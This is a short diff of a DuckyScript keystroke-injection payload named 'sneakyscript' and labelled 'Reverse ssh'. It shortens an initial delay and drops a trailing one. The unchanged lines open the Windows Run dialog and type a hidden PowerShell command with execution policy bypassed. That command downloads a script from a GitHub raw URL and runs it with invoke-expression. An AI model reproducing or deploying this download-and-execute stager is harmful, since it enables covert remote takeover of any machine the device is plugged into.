@@ -3,7 +3,7 @@ REM Name: sneakyscript
 REM Reverse ssh  
 
 REM *** Initial Delay *** 
-DELAY 2000
+DELAY 1000
 
 REM *** Open Run ***
 GUI r
@@ -16,4 +16,3 @@ REM *** Download and execute the payload ***
 
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Dev-Sadwhite/Rubber-Test/main/payloads-download/windows/1.ps1?dl=1; invoke-expression $pl 
 ENTER
-DELAY 100
